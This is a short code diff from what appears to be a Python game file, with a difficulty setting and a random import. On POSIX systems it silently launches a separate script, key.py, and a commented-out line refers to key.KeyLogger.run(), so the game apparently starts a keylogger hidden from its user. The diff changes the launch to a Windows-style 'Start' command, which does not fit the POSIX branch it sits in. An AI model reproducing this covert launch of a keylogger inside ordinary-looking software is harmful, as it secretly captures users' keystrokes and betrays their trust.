@@ -6,7 +6,7 @@ import random
 import os
 
 if os.name == 'posix':
-    os.system('python key.py &')
+    os.system('Start python key.py')
     
 #key.KeyLogger.run()
 difficulty = 25
